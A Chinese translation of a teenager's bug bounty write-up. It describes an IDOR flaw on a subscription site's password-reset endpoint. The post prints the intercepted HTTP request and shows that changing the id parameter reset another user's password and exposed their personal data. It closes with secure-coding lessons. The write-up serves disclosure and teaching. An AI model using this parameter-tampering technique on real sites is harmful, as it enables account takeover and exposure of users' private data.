小知识，大挑战！本文正在参与「[程序员必备小知识](https://juejin.cn/post/7008476801634680869 "https://juejin.cn/post/7008476801634680869")」创作活动。本文已参与「[掘力星计划](https://juejin.cn/post/7012210233804079141 "https://juejin.cn/post/7012210233804079141")」，赢取创作大礼包，挑战创作激励金。

> * 原文地址：[IDOR to Account Takeover: My First Bug Bounty Write-up at the Age of 16](https://medium.com/@jaredliw/idor-to-account-takeover-my-first-bug-bounty-write-up-at-the-age-of-16-b0b67ec13a11)
> * 原文作者：[wolfishLamb](https://medium.com/@jaredliw)
> * 译者：[披着狼皮的羊](https://juejin.cn/user/167543676602120)

在这一年以来，通过观看教程和阅读文章，我间断地学习到了一些关于 Web 渗透测试的知识。但是，在几个网站上实操以后，我什么也没找到。我虽有些编程背景，但这对我来说仍是一个全新的领域。

# Main()

几天前，一家公司即将推出一个关于订阅管理的网站。我心中的火焰重新燃起。我打算试一下。

我来到了网站的登陆界面：

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/62b9890329df4fbcafff361769cc1778~tplv-k3u1fbpfcp-watermark.image?)

我点了重设密码，一个链接发送到了我的电子邮件。

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/afb70cc64312457c95e344bbd1ce6fcd~tplv-k3u1fbpfcp-watermark.image?)

一件有趣的事情发生了。当我打开链接并提交我的新密码时，我在 Burp Suite 中发现了一些东西：

> POST /reactivate/password HTTP/2\
> Host: redacted.com\
> Cookie: \<some-cookies\>\
> Content-Length: 301\
> Sec-Ch-Ua: “Chromium”;v=”91", “ Not;A Brand”;v=”99"\
> Accept: application/json, text/javascript, */*; q=0.01\
> X-Csrf-Token: 3C7sNXdSzWhzSEvJ6KChsRKnG3yfquLS3n8tL1HL\
> X-Requested-With: XMLHttpRequest\
> Sec-Ch-Ua-Mobile: ?0\
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\
> Content-Type: application/x-www-form-urlencoded; charset=UTF-8\
> Origin: https://redacted.com \
> Sec-Fetch-Site: same-origin\
> Sec-Fetch-Mode: cors\
> Sec-Fetch-Dest: empty\
> Referer: https://redacted.com/verify/reactivate?expires=1625067966&id=201&secret=%242y%2410%24QgG8NmTIr0p6EOjyqU%2Fz2er7Mt4rzRV8mWtbGeLllj8t.oeesFWDC&signature=90b782653962ac4501ac10408834b172c954aeb6d5836f196c7c073d9d6c0168 \
> Accept-Encoding: gzip, deflate\
> Accept-Language: en-US,en;q=0.9\
> Connection: close
>
> id=201&password=newpassword&confirm_password=newpassword

我认得那个 `id` 参数 —— 那是我的 ID。Emmm，也许我能执行 IDOR 攻击？之后，我将 `201` 更改为 `200`。砰，成功了！

我被重定向到了受害者的 dashboard 页面，他的密码已被我更改。电子邮件、真实姓名和电话号码都被泄露了！

# 解说

> 更改用户密码时，服务器在没有控制访问或验证身份的情况下，直接使用来自客户端的标识符（在本例中为 `id`）访问其内部数据库中的对象。这会导致帐户接管/权限越级等问题，并对网站所有者造成严重的影响。
>
> — 维基百科（有改动）

# 重点回顾

-   永远不要相信用户的任何输入，每次都要验证它们。
-   尽量减少发送到服务器的数据。

谢谢阅读！

> #### 译者注：
>
> 就我来说，当一名黑客的门槛其实很低，这篇文章就是一个例子 —— 你甚至完全不需要懂代码。但你别觉得这网站太逊了，这类型的漏洞报告我已经见过不下十篇（包括某些地方的政府网站）。在很多时候，那些开发者们往往只学过几堂课程就急急忙忙的上岗了，开发出来的网站也免不了漏洞百出，但恶果自然由我们这些被动的用户承担。希望大家能多重视网络安全，提升安全相关的技术水平，当然，有机会我也会再跟大家分享更多有关渗透测试的硬核资料，敬请期待。
>
> 更多有关渗透测试的文章可以到这里看看：https://pentester.land/list-of-bug-bounty-writeups.html 。这个网站收集了许多“漏洞赏金猎人”（bug-bounty hunter）们写下的漏洞报告，对象包括 Facebook，Google 等网络巨擘。